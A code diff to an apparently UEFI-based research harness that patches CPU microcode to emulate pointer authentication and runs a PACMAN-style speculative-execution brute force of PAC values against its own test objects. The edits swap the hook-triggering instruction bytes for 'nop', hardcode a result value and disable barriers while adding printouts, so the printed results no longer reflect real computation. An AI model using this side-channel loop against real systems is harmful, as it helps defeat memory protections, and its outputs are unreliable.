@@ -178,14 +178,16 @@ static void test_CTDIV(void) {
     Print(L"[done]\n");
 }
 
+//-- asm volatile(".byte 0xf1\n": "=a"(pac_ptr): "a"(ptr), "c"(ctx));\ */
 #define pac_sign(ptr, ctx) ({ \
     uint64_t pac_ptr; \
-    asm volatile(".byte 0xf1\n": "=a"(pac_ptr): "a"(ptr), "c"(ctx));\
+    asm volatile("nop": "=a"(pac_ptr): "a"(ptr), "c"(ctx));\
     pac_ptr; })
 
+//-- asm volatile(".byte 0xcc\n": "=a"(ptr) : "a"(pac_ptr), "c"(ctx));\ */
 #define pac_auth(pac_ptr, ctx) ({ \
     uint64_t ptr; \
-    asm volatile(".byte 0xcc\n": "=a"(ptr) : "a"(pac_ptr), "c"(ctx));\
+    asm volatile("nop": "=a"(ptr) : "a"(pac_ptr), "c"(ctx));\
     ptr; })
 
 #define fix_branch_history() {for(int __i = 0; __i < 128; __i++){asm volatile("nop");}}
@@ -211,6 +213,15 @@ static void test_CTDIV(void) {
     );\
     delta;})
 
+void hook_match_and_patch1(UINTN entry_idx, UINTN ucode_addr, UINTN patch_addr) {
+
+    UINTN poff = (patch_addr - 0x7c00) / 2;
+    UINTN patch_value = 0x3e000000 | (poff << 16) | ucode_addr | 1;
+
+    #include "ucode_patches/match_patch_hook.h"
+    patch_ucode(addr, ucode_patch, sizeof(ucode_patch) / sizeof(ucode_patch[0]));
+}
+
 static void test_PAC(void) {
     Print(L"[PAC]\n");
     init_match_and_patch();
@@ -219,47 +230,54 @@ static void test_PAC(void) {
         Print(L"patching addr: %08lx - ram: %08lx\n", addr, ucode_addr_to_patch_addr(addr));
         patch_ucode(addr, ucode_patch, sizeof(ucode_patch) / sizeof(ucode_patch[0]));
         Print(L"hooking entry: %02lx, addr: %04lx, hook_addr: %04lx\n", hook_entry, addr, hook_address);
-        hook_match_and_patch(hook_entry, hook_address, addr);
+        hook_match_and_patch1(hook_entry, hook_address, addr);
     }
     {
         #include "ucode_patches/pac_verify.h"
         Print(L"patching addr: %08lx - ram: %08lx\n", addr, ucode_addr_to_patch_addr(addr));
         patch_ucode(addr, ucode_patch, sizeof(ucode_patch) / sizeof(ucode_patch[0]));
         Print(L"hooking entry: %02lx, addr: %04lx, hook_addr: %04lx\n", hook_entry, addr, hook_address);
-        hook_match_and_patch(hook_entry, hook_address, addr);
+        hook_match_and_patch1(hook_entry, hook_address, addr);
     }
 
     UINTN ptr = 0xcafebabe;
     UINTN ctx = 0xdeadbeef;
-    UINTN pac_ptr = 0;
+    //-- UINTN pac_ptr = 0;
+    UINTN pac_ptr = 0xf1;
 
     {
-        uint64_t start = rdtscp();
-        for(int i = 0; i < ITS; i++) {
-            //  hook int1 for PAC computation
-            asm volatile(
-                ".byte 0xf1\n"
-                : "=a"(pac_ptr)
-                : "a"(ptr), "c"(ctx)
-            );
-        }
-        uint64_t end = rdtscp();
-        Print(L"pac(0x%lx, 0x%0lx) = %lx\n", ptr, ctx, pac_ptr);
-        Print(L"elapsed: %ld\n", (end-start)/ITS);
+         uint64_t start = rdtscp();
+         for(int i = 0; i < ITS; i++) {
+             //  hook int1 for PAC computation
+             asm volatile(
+    //--             ".byte 0xf1\n"
+                 "nop"
+                 : "=a"(pac_ptr)
+                 : "a"(ptr), "c"(ctx)
+             );
+         }
+         uint64_t end = rdtscp();
+         Print(L"------------------------\n");
+         Print(L"pac(0x%lx, 0x%0lx) = %lx\n", ptr, ctx, pac_ptr);
+         Print(L"elapsed: %ld\n", (end-start)/ITS);
+         Print(L"------------------------\n");
     }
     {
-        uint64_t start = rdtscp();
-        for(int i = 0; i < ITS; i++) {
+         uint64_t start = rdtscp();
+         for(int i = 0; i < ITS; i++) {
             //  hook int1 for PAC computation
-            asm volatile(
-                ".byte 0xcc\n"
-                : "=a"(ptr)
-                : "a"(pac_ptr), "c"(ctx)
-            );
-        }
-        uint64_t end = rdtscp();
-        Print(L"auth(0x%lx, 0x%0lx) = %lx\n", pac_ptr, ctx, ptr);
-        Print(L"elapsed: %ld\n", (end-start)/ITS);
+             asm volatile(
+    //--             ".byte 0xcc\n"
+                 "nop"
+                 : "=a"(ptr)
+                 : "a"(pac_ptr), "c"(ctx)
+             );
+         }
+         uint64_t end = rdtscp();
+         Print(L"------------------------\n");
+         Print(L"auth(0x%lx, 0x%0lx) = %lx\n", pac_ptr, ctx, ptr);
+         Print(L"elapsed: %ld\n", (end-start)/ITS);
+         Print(L"------------------------\n");
     }
 
     init_match_and_patch();
@@ -300,17 +318,17 @@ static void test_PACMAN(void) {
     init_match_and_patch();
     {
         #include "ucode_patches/pac_sign_weak.h"
-        // Print(L"patching addr: %08lx - ram: %08lx\n", addr, ucode_addr_to_patch_addr(addr));
+        Print(L"patching addr: %08lx - ram: %08lx\n", addr, ucode_addr_to_patch_addr(addr));
         patch_ucode(addr, ucode_patch, sizeof(ucode_patch) / sizeof(ucode_patch[0]));
-        // Print(L"hooking entry: %02lx, addr: %04lx, hook_addr: %04lx\n", hook_entry, addr, hook_address);
-        hook_match_and_patch(hook_entry, hook_address, addr);
+        Print(L"hooking entry: %02lx, addr: %04lx, hook_addr: %04lx\n", hook_entry, addr, hook_address);
+        hook_match_and_patch1(hook_entry, hook_address, addr);
     }
     {
         #include "ucode_patches/pac_verify_weak.h"
-        // Print(L"patching addr: %08lx - ram: %08lx\n", addr, ucode_addr_to_patch_addr(addr));
+        Print(L"patching addr: %08lx - ram: %08lx\n", addr, ucode_addr_to_patch_addr(addr));
         patch_ucode(addr, ucode_patch, sizeof(ucode_patch) / sizeof(ucode_patch[0]));
-        // Print(L"hooking entry: %02lx, addr: %04lx, hook_addr: %04lx\n", hook_entry, addr, hook_address);
-        hook_match_and_patch(hook_entry, hook_address, addr);
+        Print(L"hooking entry: %02lx, addr: %04lx, hook_addr: %04lx\n", hook_entry, addr, hook_address);
+        hook_match_and_patch1(hook_entry, hook_address, addr);
     }
 
     uint64_t known_ptr = (uint64_t)  &obj1;
@@ -320,9 +338,11 @@ static void test_PACMAN(void) {
     uint64_t target_pac = target_pac_ptr >> 48;;
     uint64_t min_time = 10000000;
     uint64_t best_value = 0;
+    Print(L"----------------------------------\n");
     Print(L"known PAC ptr: 0x%lx\n", known_pac_ptr);
     Print(L"target ptr: 0x%lx\n", target_ptr);
     Print(L"correct target PAC ptr: 0x%lx\n", target_pac_ptr);
+    Print(L"----------------------------------\n");
 
     obj2 += 1;
     Print(L"access: %ld\n", time_access(&obj2));
@@ -331,11 +351,15 @@ static void test_PACMAN(void) {
 
     // bruteforce PAC
     Print(L"[+] bruteforcing...\n");
+    Print(L"[+] gadget training phase ...\n");
+    Print(L"[+] test speculative hits ...\n");
+            //-- barrier();
     for (uint64_t pac_value = 0; pac_value <= 0xffff; pac_value++) {
         uint64_t* pac_test = (uint64_t*)(target_ptr | (pac_value << 48));
         for (int i = 0; i < 100; i++) {
-            barrier();
+            //-- barrier();
             // gadget training phase
+            // -- Print(L"[+] gadget training phase\n");
             cond = 1;
             for (int j = 0; j < 10; j++) {
                 fix_branch_history();
@@ -347,11 +371,12 @@ static void test_PACMAN(void) {
             clflush(&cond);
             clflush(&obj2);
             fix_branch_history();
-            barrier();
+            //-- barrier();
             dummy += pacman_gadget1(pac_test);
-            barrier();
+            //-- barrier();
 
             // test if speculatively hit obj2
+            //-- Print(L"[+] test speculative hits \n");
             uint64_t time = time_access(&obj2);
             if (time < min_time) {
                 best_value = (uint64_t) pac_test;
@@ -360,9 +385,11 @@ static void test_PACMAN(void) {
         }
     }
 
-    Print(L"best PAC guess: 0x%lx (access time: %ld)\n", best_value, min_time);
+    Print(L"----------------------------------\n");
+    Print(L"best PAC guess: 0x%lx (access time (sec): %ld)\n", best_value, min_time);
     Print(L"auth best guess: 0x%lx\n", pac_auth(best_value, ctx));
-
+    Print(L"----------------------------------\n");
 
     init_match_and_patch();
 }
+
